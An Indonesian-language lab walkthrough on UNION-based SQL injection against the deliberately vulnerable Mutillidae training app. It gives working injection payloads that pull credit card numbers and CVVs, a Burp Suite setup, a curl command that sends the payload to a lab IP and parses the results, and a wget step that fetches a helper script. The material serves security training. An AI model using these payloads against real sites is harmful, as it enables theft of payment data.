# SQL Injection Union Exploit #1

## Database Practice

1. Masuk ke mysql dengan menjalankan command
```
mysql -u root
```
![1](/lesson8/1.png)

2. Gunakan database ```owasp10``` dan lihat semua sabel yang tersedia
```
mysql> use owasp10;
mysql> show tables;
```
![1](/lesson8/2.png)

3. Lihat deskripsi dari tabel ```accounts``` dan ```credit_cards```
```
mysql> desc accounts;
mysql> desc credit_cards;
```
![1](/lesson8/3.png)

4. Gunakan union untuk menempelkan tabel ```credit_cards``` dengan tabel ```accounts```
```
select * from accounts union select ccid,ccnumber,ccv,expiration,null from credit_cards
```
![1](/lesson8/4.png)
![1](/lesson8/5.png)

## Try SQLi Union Mutillidae

1. Masuk ke halaman sqli user info dengan cara klik menu pada sidebar kiri ```Owasp Top 10 -> A1 - Injection -> SQLi - Extract Data -> User Info```
![1](/lesson8/6.png)

2. Setting proxy agar dapat ditangkap oleh Burpsuite dengan host ```127.0.0.1``` dan port ```8080```
![1](/lesson8/7.png)

3. Buka program Burpsuite
![1](/lesson8/8.png)

4. Pastikan option pada tab proxy (di section proxy listener) terdaftar alamat ```127.0.0.1``` dan portnya adalah ```8080```
![1](/lesson8/11.png)

5. Pastikan juga intercept pada tab proxy menunjukkan bahwa intercept nya dimatikan ```intercept is off```
![1](/lesson8/12.png)

6. kembali ke halaman user-info. kita akan melihat form login. inspect elemnet pada kolom ```name``` tambahkan size menjadi 100 ```size="100"``` dan masukkan syntax sqli ke kolom ```name```
```
' union select null-- '
```
jangan lupa unutk menambahkan spasi setelah syntax comment ```"-- "```
![1](/lesson8/13.png)

7. Setelah melewati form login kita akan menemukan error yang mengatakan query yang digunakan mempunyai jumlah kolom yang berbeda
![1](/lesson8/14.png)

8. kembali lagi ke halaman login lalu kita coba dengan menambah jumlah kolom. misal kita coba dengan 5 kolom.
```
' union select null,null,null,null,null-- '
```
jangan lupa unutk menambahkan spasi setelah syntax comment ```"-- "```
![1](/lesson8/15.png)

9. Setelah melakukan sqli union dengan 5 kolom maka kita lihat tidak ada pesan error. dan halaman tersebut memunculkan string ```username```, ```password``` dan ```signature``` yang menandakan bahwa kolom yang tersedia dan ditampilkan adalah kolom tersebut.
![1](/lesson8/16.png)

10. Lakukan kembali sqli union pada halaman login dengan cara mengganti null dengan string apapun. misal:
```
' union select 1,2,3,4,5--
```
jangan lupa unutk menambahkan spasi setelah syntax comment ```"-- "```
![1](/lesson8/17.png)

11. Setelah melewati halaman login, bisa dilihat bahwa yang di print adalah kolom urutan ke 2,3 dan 4 pada tabel ```account```
![1](/lesson8/18.png)

12. Setelah mengetahui struktur query yang digunakan pada form login, maka saatnya kita melakukan sqli yang sebenarnya dengan menggabungkan tabel ```account``` dan ```credit_cards```
```
' union select ccid,ccnumber,ccv,expiration,null from credit_cards--
```
jangan lupa unutk menambahkan spasi setelah syntax comment ```"-- "```
![1](/lesson8/19.png)

13. Dapat dilihat disitu kita mendapatkan info dari tabel ```credit_cards```
![1](/lesson8/20.png)

14. Buka Burpsuite dan lihat request terakhir. yang mengandung sqli union yang terakhir kita lakukan.
![1](/lesson8/21.png)

15. setelah itu lakukan curl untuk mendapatkan data tersebut via terminal dengan menggunakan command:
```
curl -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+union+select+ccid%2Cccnumber%2Cccv%2Cexpiration%2Cnull+from+credit_cards+--+&password=&user-info-php-submit-button=View+Account+Details" --location "http://10.151.36.156/mutillidae/index.php" --cookie= <cookie yang terdapat pada paket request terakhir>| grep -i "Username=" | awk 'BEGIN{FS="<"}{for (i=1; i<=NF; i++) print $i}' | awk -F\> '{print $2}'
```
![1](/lesson8/22.png)

16. Lakukan perl parser dengan mendownload script
```
wget http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson8/lesson8.pl.TXT
```
jalankan script tersebut
![1](/lesson8/23.png)
